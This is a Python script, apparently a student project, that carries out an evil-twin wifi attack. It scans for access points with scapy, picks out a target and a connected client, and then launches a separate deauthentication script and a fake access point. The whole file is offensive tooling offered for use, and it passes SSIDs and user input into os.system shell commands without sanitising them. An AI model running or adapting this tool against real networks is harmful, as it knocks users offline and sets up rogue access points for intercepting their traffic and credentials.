import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt 

# Reference to the scanning parts - https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy

# import json
#Notations: SSID = Network name ,BSSID = AP mac address , ESSID = A set of ssids (network names)
ap_list = []
### Coloum indices for 'ap_list'. 
ESSID = 0
BSSID = 1 
CHANNEL = 2
essids_set = set()

client_list = []

time_out = 40

### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


######################################## INTERFACE MODE ###################################

###Turn on monitor mode 
### Select the interface that will turned on to monitor mode to perform hardware and software low level network system operations such as scan wifi networks && send deauth packets.
def monitor_mode():
    global interface
    print(G + "*** 1. Turn on 'monitor mode' for the desired interface. *** \n")
    #entr = input ("Press Enter to continue.........")
    print(W)
    os.system('ifconfig')
    interface = input(G + "Please enter the interface name you want to put in 'monitor mode' and press enter: ")
    print(W)
    # Put the choosen interface in 'monitor mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')

###Turn on managed mode 
### End of the attack attack, switch back the interface to 'managed mode'. 
def managed_mode():
    print(G + "*** 5. Turn on 'managed mode' for the desired interface : "+interface+ " *** \n")
    print(W)
    # Put the choosen interface back in 'managed mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')

    

######################################## SCAN NETWORK ###################################

### Rapper function for 'wifi_scan()'. 
def ap_scan_rap():
    print(G + "*** 2: Start network sniffer to find the available APS for the attack. *** \n")
    ap_scan()

                                         
### Scan the network and show the list of APS that were found
def ap_scan():
    channel_changer = Thread(target = change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    print("\n      Scanning for networks...\n")
    # Sniffing packets - scanning the network for AP in the area
    # iface – the interface that is in monitor mode
    # prn – function to apply to each packet
    # timeout – stop sniffing after a given time
    sniff(iface = interface, prn = ap_scan_pkt, timeout=time_out)
    num_of_ap = len(ap_list)
    # If at least one AP was found, print all the found APs
    if num_of_ap > 0: 
        # If at least 1 AP was found. 
        print("\n*************** APs list ***************\n")
        for x in range(num_of_ap):
            print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
        print("\n************* FINISH SCANNING *************\n")
        invalidInput = True
        # Choosing the AP to attack
        while invalidInput:  
            ap_index = int(input("Please enter the number of the AP in the list you want to attack and press enter: "))
            #validate user input 
            if ap_index < 0 or ap_index > num_of_ap:
                print("Invalid input - AP number is not in the list choose again. \n")
            else:
                # Print the choosen AP
                print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
                # Set the channel as the choosen AP channel in order to send packets to connected clients later
                set_channel(int(ap_list[ap_index][CHANNEL]))
                # Save all the needed information about the choosen AP
                global ap_mac
                global ap_name
                global ap_channel
                ap_mac = ap_list[ap_index][BSSID]
                ap_name = ap_list[ap_index][ESSID]
                ap_channel = ap_list[ap_index][CHANNEL]
                invalidInput = False
    else: 
        # If no AP was found. 
        rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print("  Enable interface mode managed and exit the program ")
            managed_mode()
            sys.exit(0)
        else:
            ap_scan()


### In order to scan the network for multiple APs we need to check with each channel in the range [1,14]. 
### Usually routers will use the 2.4GHz band with a total of 14 channels. 
### (In reality it may be 13 or even less that are used around the world) 
def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        # switch channel in range [1,14] each 0.5 seconds
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


### After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as the choosen AP. 
def set_channel(channel):
    os.system('iwconfig %s channel %d' % (interface, channel))

### Dot11 represent the MAC header, it is the abbreviated specification name 802.11
### Dot11Elt layers is where we put the necessary information: SSID, supported speeds (up to eight), additional supported speeds, channel used.
### Dot11Beacon represents an IEEE 802.11 Beacon

### sniff(..., prn = ap_scan_pkt, ...) 
### The argument 'prn' allows us to pass a function to apply to each packet sniffed
def ap_scan_pkt(pkt):
    # We are interested only in Beacon frame
    # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
    if pkt.haslayer(Dot11Beacon):
        # Get the source MAC address - BSSID of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = pkt[Dot11Elt].info.decode()
        # Check if the new found AP is already in the AP set
        if essid not in essids_set:
            essids_set.add(essid)
            # network_stats() function extracts some useful information from the network - such as the channel
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            # Add the new found AP to the AP list
            ap_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))




######################################## SCAN CLIENTS ###################################

### Rapper function for 'client_scan()'. 
def client_scan_rap():
    print(G + "\n*** 3. Start sniffer to find the AP connected clients *** \n")
    print(G+ "\n      Scanning for clients...\n")
    print(W)
    client_scan()
    print("\n")


### In this fucntion we scan the network for clients who are connected to the choosen AP. 
### We present to the user all the clients that were found, and he choose which client he want to attack. 
def client_scan():
    # Sniffing packets - scanning the network for clients which are connected to the choosen AP 
    sniff(iface=interface, prn=client_scan_pkt, timeout=time_out)
    num_of_client = len(client_list)
    # If at least one client was found, print all the found clients
    if num_of_client > 0: 
        # If at least 1 client was found. 
        print("\n*************** Clients Table ***************\n")
        for x in range(num_of_client):
            print("[" + str(x) + "] - "+ client_list[x])
        print("\n************** FINISH SCANNING **************\n")
        # Choosing the client to attack
        client_index = input("Please enter the number of the client in the list you want to attack or enter 'R' if you want to rescan and press enter: ")
        if client_index == 'R': 
            # Rescan
            client_scan()
        elif client_index.isnumeric():
            # Client was choosen
            invalidInput = True
            while invalidInput:  
                #validate user input 
                client_index_invalid = int(client_index)
                if client_index_invalid < 0 or client_index_invalid > num_of_client:
                    print("Invalid input - Client number is not in the list choose again. \n")
                    client_index = input("Please enter the number of the client you want to attack and press enter:")
                else:
                    print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
                    global client_mac
                    # Save the needed information about the choosen client
                    client_mac = client_list[int(client_index)]
                    invalidInput = False

    else: 
        # If no client was found. 
        rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print(" Enable interface mode managed and exit the program ")
            managed_mode()
            sys.exit(0)
        else:
            client_scan()

### sniff(..., prn = client_scan_pkt, ...) 
### The argument 'prn' allows us to pass a function that executes with each packet sniffed 
def client_scan_pkt(pkt):
    global client_list
    # We are interested in packets that send from the choosen AP to a client (not broadcast)
    # ff:ff:ff:ff:ff:ff - broadcast address 
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                # Add the new found client to the client list
                client_list.append(pkt.addr1)


######################################## Deauthentication Attcak ###################################


### We send the deauthentication packets between the choosen AP and client. 
def deauth_attack():
    print("\n*** 4: Perform Deauthentication Attcak to disconnect the AP and the client. *** \n")
    print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
    print(W)
    # Open a new terminal for 'fake_ap.py'
    os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
    # In the current terminal we will send non-stop deauthentication packets
    os.system('python3 deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)


######################

if __name__ == "__main__":
    
    ###Process must be execute as root to perform system hardware && software actions.
    if os.geteuid():
        sys.exit(R + '[**] Please run as root')
    
    print(P + "********************************************************************** \n")
    print("***** Welcome to the EVIL TWIN ATTACK program***** \n")
    #print("***** Part A: SELECT the AP we want to attack ***** \n")
    print("********************************************************************** \n")
    
    ### Step 1: Select an interface and turn on moitor mode for it. 
    monitor_mode()

    ### Step 2: Choosing the AP that we want to attack. 
    ap_scan_rap()
    
    ### Step 3: Checking that the choosen AP have client that connected to it and choose a client that will be disconnected. 
    client_scan_rap()
    
    ### Step 4: Running deauthentication attack.
    deauth_attack()
    
    ### Step 5: Put the interface back in managed mode  
    managed_mode()
    
    



